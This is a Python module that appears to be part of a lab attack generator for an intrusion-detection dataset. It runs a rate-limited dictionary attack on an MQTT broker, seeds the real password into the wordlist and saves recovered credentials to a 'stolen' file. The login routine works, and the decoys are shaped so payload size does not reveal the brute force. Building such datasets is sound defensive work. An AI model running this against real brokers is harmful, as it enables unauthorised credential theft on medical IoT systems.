"""bruteforce: rate-limited dictionary attack against the lab broker. To guarantee the dataset
has a successful credential-access event, the wordlist seeds the real password (from the
provisioned creds file) at a random position among decoys. Recovered creds go to
stolen_creds.json for the abuse classes."""
import string
import threading
import time

import paho.mqtt.client as mqtt

DECOYS = ["admin", "1234", "password", "mqtt", "test", "root", "nurse",
          "hospital", "changeme", "iot", "medical", "ward", "letmein", "default"]
# Lengths of the base decoys, reused to shape synthetic decoys so the CONNECT payload-size
# distribution (hence mqtt_*_payload) is unchanged when the wordlist is lengthened.
DECOY_LENGTHS = [len(w) for w in DECOYS]


def _try_login(broker_ip, user, password, timeout=5):
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5)
    c.username_pw_set(user, password)
    res, ev = {}, threading.Event()
    c.on_connect = lambda cl, u, f, rc, p: (res.__setitem__("rc", rc), ev.set())
    try:
        c.connect(broker_ip, 1883)
        c.loop_start()
        ev.wait(timeout)
        c.loop_stop()
        c.disconnect()
    except Exception:
        return False
    rc = res.get("rc")
    return rc is not None and not rc.is_failure


def _decoys(rng, n, exclude):
    """Return n unique decoy passwords: the base DECOYS, then synthetic ones whose lengths are
    drawn from the base length distribution (random lowercase fill). Never yields `exclude` (the
    real password). Keeping the length distribution fixed means lengthening the wordlist does not
    shift CONNECT payload sizes, so payload size can't become a trivial bruteforce tell."""
    out = list(dict.fromkeys(DECOYS))
    seen = set(out)
    while len(out) < n:
        length = rng.choice(DECOY_LENGTHS)
        cand = "".join(rng.choice(string.ascii_lowercase) for _ in range(length))
        if cand != exclude and cand not in seen:
            seen.add(cand)
            out.append(cand)
    return out[:n]


def _wordlist(rng, real, wordlist_len):
    """A shuffled decoy list of length `wordlist_len` with the real password inserted at a random
    position (so the guess that succeeds is not at a fixed index). delay x position sets run time."""
    wl = _decoys(rng, max(wordlist_len, len(DECOYS)), real)
    rng.shuffle(wl)
    if real:
        wl.insert(rng.randrange(len(wl) + 1), real)
    return wl


def bruteforce(ctx, params):
    users = params.get("users") or [ctx.nurse_user, ctx.rng.choice(ctx.monitor_users)]
    delay = float(params.get("delay", 0.3))
    # Longer wordlist => longer run (~delay x position per user). Default keeps prior behaviour.
    wordlist_len = int(params.get("wordlist_len", len(DECOYS)))
    recovered, tried = {}, 0
    for user in users:
        for pw in _wordlist(ctx.rng, ctx.provisioned(user), wordlist_len):
            tried += 1
            time.sleep(delay)          # rate-limit the guesses
            if _try_login(ctx.broker_ip, user, pw):
                recovered[user] = {"password": pw, "via": "bruteforce"}
                break
    if recovered:
        ctx.save_stolen(recovered)
    return {"targets": [ctx.broker_ip],
            "outcome": "success" if recovered else "fail",
            "params_out": {"wordlist_len": wordlist_len, "guesses": tried},
            "notes": f"{tried} guesses at {delay}s spacing (wordlist_len={wordlist_len}); "
                     f"recovered {sorted(recovered)}"}


bruteforce.STAGE = "credential-access"
